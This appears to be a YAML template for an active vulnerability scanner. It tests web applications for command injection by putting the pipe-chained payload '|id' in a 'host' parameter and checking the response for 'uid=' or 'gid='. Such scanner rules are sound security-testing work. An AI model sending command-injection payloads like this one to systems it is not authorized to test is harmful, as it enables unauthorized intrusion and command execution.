id: patt-cmdi-chain-02-host
name: 'PATT cmdi patt-cmdi-chain-02 via host'
severity: critical
type: active
tags:
  - cmdi
  - patt
description: 'PATT chaining pipe. [patt:patt-cmdi-chain-02] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/README.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      host:
        - '|id'
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
